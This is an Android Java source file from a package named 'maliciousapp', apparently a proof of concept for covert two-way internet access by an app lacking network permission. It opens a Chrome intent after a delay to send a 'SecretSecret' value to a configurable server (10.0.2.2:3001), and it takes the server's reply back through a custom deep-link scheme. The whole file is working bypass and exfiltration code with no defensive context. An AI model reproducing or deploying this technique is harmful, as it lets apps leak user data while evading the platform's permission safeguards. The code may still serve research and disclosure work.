package nikita.kurtin.maliciousapp;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.LayoutInflater;

import java.io.IOException;

public class Internet2Way extends AppCompatActivity {

    private Handler h;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_internet2_way);

        h = new Handler(Looper.getMainLooper());
    }

    @Override
    protected void onStart() {
        super.onStart();


        // Scheme and host must match those in manifest
        String scheme = "aaaa", host = "bbbb";

        // Receiving data:
        Uri uri = getIntent().getData();
        if(uri != null && scheme.equals(uri.getScheme()) && host.equals(uri.getHost()) ){
            System.out.println("POC unauthorized 2way internet - received data from server");
            System.out.printf("POC received %s \n", uri.getQuery());
            finish();
            return;
        }

        // Sending data:
        final String baseUrl = "http://10.0.2.2:3001"; // Change with your server address
        final String url = baseUrl+"/loc?scheme="+scheme+"&host="+host+"&dataFromAndroid=SecretSecret";
        h.postDelayed(()-> {
            System.out.println("POC unauthorized 2way internet - send data from Android");
            Uri chromeUri = Uri.parse("googlechrome://navigate?url="+url);
            Intent i = new Intent(Intent.ACTION_VIEW, chromeUri);
            i.setPackage("com.android.chrome");
            startActivity(i);
            finish();
        }, 6000); // Executed after 6 seconds

    }
}